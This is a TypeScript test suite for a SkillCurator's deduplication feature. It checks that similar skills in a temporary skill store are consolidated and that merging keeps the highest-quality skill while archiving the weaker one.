describe('SkillCurator Enhanced Dedup', () => {
  let tempDir: string;
  let store: SkillStore;
  let manager: SkillManager;
  let curator: SkillCurator;
  let archiveDir: string;
  let backupDir: string;

  before(async () => {
    tempDir = createTempDir();
    archiveDir = path.join(tempDir, '.archive');
    backupDir = path.join(tempDir, '.backups');
    store = makeSkillStore(tempDir);
    manager = new SkillManager(store);
    curator = new SkillCurator(manager, archiveDir, backupDir);

    await manager.create('data-analysis-py', 'Python-based data analysis with pandas', {
      category: 'coding',
      tags: ['python', 'data', 'analysis'],
      source: 'user',
      qualityScore: 0.8,
      usageCount: 10,
    });
    await manager.create('python-data-analyzer', 'Data analysis using Python tools', {
      category: 'coding',
      tags: ['python', 'data'],
      source: 'user',
      qualityScore: 0.7,
      usageCount: 5,
    });
    await manager.create('unrelated-web', 'Web scraping with cheerio', {
      category: 'coding',
      tags: ['web', 'scraping'],
      source: 'user',
      qualityScore: 0.6,
      usageCount: 3,
    });
  });

  after(() => {
    rmdirRecursive(tempDir);
  });

  it('curate consolidates similar skills', async () => {
    const report = await curator.curate();
    assert.ok(report.totalBefore >= 3, 'Should start with 3+ skills');
    assert.ok(Array.isArray(report.consolidated), 'Should have consolidated array');
    assert.ok(report.runTimestamp.length > 0);
  });

  it('mergeSimilar keeps highest quality skill', async () => {
    const catalog: SkillCatalogEntry[] = [
      {
        name: 'low',
        description: 'low quality',
        category: 'coding',
        tags: ['a'],
        usageCount: 1,
        qualityScore: 0.3,
        pinned: false,
      },
      {
        name: 'high',
        description: 'high quality',
        category: 'coding',
        tags: ['a'],
        usageCount: 10,
        qualityScore: 0.9,
        pinned: false,
      },
    ];
    const result = await curator.mergeSimilar(catalog, 'keep_highest_quality');
    assert.strictEqual(result.survivor, 'high', 'Should keep highest quality skill');
    assert.ok(result.archived.includes('low'), 'Should archive lower quality skill');
  });
});
